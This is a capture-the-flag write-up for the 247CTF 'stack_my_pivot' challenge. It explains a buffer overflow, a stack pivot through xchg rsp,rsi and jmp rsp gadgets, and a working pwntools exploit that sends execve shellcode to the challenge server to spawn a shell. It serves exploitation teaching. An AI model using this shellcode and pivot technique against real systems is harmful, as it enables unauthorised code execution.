# stack_my_pivot - 247CTF PWN Challenge

## Challenge Info
- **Name**: stack_my_pivot
- **Category**: PWN
- **Remote**: `tcp://149d2d3709435f15.247ctf.com:50231`
- **Description**: "Can you pivot to gain code execution?"

## Flag
```
247CTF{XXXXXXXXXXXXXXXXXXXX}
```

---

## Binary Analysis

### Protections
```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX disabled         <- Stack is executable!
PIE:        No PIE (0x400000)
RWX:        Has RWX segments
```

### Program Flow

The binary asks for two inputs:
1. First name (up to 50 bytes) - stored in a buffer pointed by RSI
2. Surname (26 bytes read) - has buffer overflow

### Key Gadgets
```
0x400732: xchg rsp, rsi ; nop ; pop rbp ; ret   <- Stack pivot!
0x400738: jmp rsp                                <- Execute at RSP
```

---

## Vulnerability

1. **Buffer Overflow**: The surname input overflows, allowing control of return address
2. **Stack Pivot**: The `xchg rsp, rsi` gadget swaps RSP with RSI (which points to first name buffer)
3. **Executable Stack**: NX is disabled, so we can execute shellcode

---

## Exploitation Strategy

### The Challenge
- Limited space in surname buffer (only ~26 bytes after overflow)
- Need to execute shellcode but it doesn't fit in surname buffer
- First name buffer is larger (50 bytes) and pointed by RSI

### The Solution: Stack Pivot

1. **Stage 1 - First Name**: Store shellcode (23 bytes) padded to 50 bytes
2. **Stage 2 - Surname**:
   - Overflow to return address
   - Use `jmp rsp` gadget to execute code after return address
   - Short jump (`eb ae` = jmp -0x52) backward to reach shellcode via pivot
   - Trigger `xchg rsp, rsi` to pivot stack to first name buffer

### Payload Layout

**First Name (50 bytes)**:
```
[shellcode 23 bytes][NOP padding to 50 bytes]
```

**Surname**:
```
[8 bytes padding][jmp rsp addr][short jmp eb ae][NOPs][xchg rsp,rsi]
         │              │              │                    │
      overflow     return addr    executes here        pivots stack
```

### Execution Flow
1. Return to `jmp rsp` (0x400738)
2. Execute short jump at RSP location
3. Jump lands near `xchg rsp, rsi`
4. RSP now points to first name buffer (shellcode)
5. Shellcode executes, spawning shell

---

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

HOST = "149d2d3709435f15.247ctf.com"
PORT = 50231

XCHG_RSP_RSI = 0x400732
JMP_RSP = 0x400738

def exploit():
    io = remote(HOST, PORT)

    # Shellcode execve("/bin/sh") - 23 bytes
    shellcode = asm('''
        xor esi, esi
        push rsi
        mov rdi, 0x68732f6e69622f
        push rdi
        push rsp
        pop rdi
        push rsi
        pop rdx
        push 59
        pop rax
        syscall
    ''')

    print(f"[*] Shellcode size: {len(shellcode)} bytes")

    # Stage 1: First name - shellcode padded to 50 bytes
    payload1 = shellcode.ljust(50, b'\x90')

    io.recvuntil(b"first name?")
    io.send(payload1)

    # Stage 2: Surname - overflow + pivot
    payload2 = b''
    payload2 += p64(0xdeadbeef)      # padding (8 bytes)
    payload2 += p64(JMP_RSP)         # return to jmp rsp
    payload2 += b'\xeb\xae'          # short jmp -0x52
    payload2 += b'\x90' * 6          # NOP sled
    payload2 += p32(XCHG_RSP_RSI)    # pivot gadget

    io.recvuntil(b"surname?")
    io.send(payload2)

    io.sendline(b'cat flag*')
    print(io.recvall(timeout=3).decode(errors='ignore'))

if __name__ == "__main__":
    exploit()
```

---

## Key Takeaways

1. **Stack Pivoting**: When buffer space is limited, use `xchg rsp, reg` to pivot stack to a larger controlled buffer
2. **Register Preservation**: RSI retained pointer to first buffer - exploit this!
3. **Short Jumps**: `eb XX` is a 2-byte relative jump, useful in tight spaces
4. **Gadget Chaining**: Combine `jmp rsp` with short jump to reach pivot gadget
5. **Shellcode Optimization**: Use compact shellcode (push/pop tricks, xor for zeroing)

---

## Files
- `stack_my_pivot` - Challenge binary
- `solve.py` - Working exploit script
- `flag.txt` - Captured flag (CENSURED)
